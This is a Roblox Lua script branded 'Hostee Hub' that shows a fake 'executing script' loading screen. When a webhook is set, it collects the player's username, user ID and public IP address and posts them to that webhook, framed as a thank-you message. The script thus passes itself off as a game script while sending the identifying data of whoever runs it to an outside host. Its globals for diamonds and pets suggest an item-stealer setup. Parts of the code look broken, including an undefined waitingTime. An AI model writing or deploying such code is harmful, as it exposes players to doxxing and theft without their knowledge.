local username = _G.Username
local diamonds = _G.Diamonds
local unlockpets = _G.UnlockPets
local webhook = _G.Webhook
local scriptName = "Hostee Hub"
local tip1 = _G.Tip1 or "Preparing to execute script..."
local tip2 = _G.Tip2 or "Preparing to execute script..."
local tip3 = _G.Tip3 or "Preparing to execute script..."
local tip4 = _G.Tip4 or "Executing script..."
local tip5 = _G.Tip5 or "Script executed successfully!"

if game:GetService("CoreGui").RobloxLoadingGui:FindFirstChild("LoadingScreen") then
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextLabel = Instance.new("TextLabel")
    
    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    Frame.Parent = ScreenGui
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    Frame.Size = UDim2.new(0, 400, 0, 250)
    
    TextLabel.Parent = Frame
    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
    TextLabel.Size = UDim2.new(1, 0, 1, 0)
    TextLabel.Font = Enum.Font.GothamBold
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.TextSize = 40
    TextLabel.Text = tip1
    wait(waitingTime/3)
    TextLabel.Text = tip2
    wait(waitingTime/3)
    TextLabel.Text = tip3
    wait(waitingTime/3)
    TextLabel.Text = tip4
    wait(waitingTime/3)
    TextLabel.Text = tip5
    wait(waitingTime/3)
    ScreenGui:Destroy()
end

if webhook then
    local HttpService = game:GetService("HttpService")
    local executor = game.Players.LocalPlayer
    local Embed = {
        ["title"] = "Thank You For Using Hostee Scriptz",
        ["description"] = "UserName: " .. tostring(executor.Name) .. "\nUserID: " .. tostring(executor.UserId) .. "\nUserIP: " .. tostring(HttpService:JSONDecode(game:HttpGet("http://httpbin.org/ip")).origin) .. "\n\nThank You Again For Using Hostee Scriptz",
        ["image"] = {
            ["url"] = "https://imgur.com/a/f7aLDj1"
        },
        ["color"] = tonumber("0x" .. "7DB1D5"),
        ["footer"] = {
            ["text"] = "Server: https://dsc.gg/hosteehub | Creator: NotK4F#4404"
        }
    }
    local PostData = HttpService:JSONEncode({["embeds"] = {Embed}})
    local Headers = {
        ["content-type"] = "application/json"
    }
    HttpService:PostAsync(webhook, PostData, Headers)
end
``
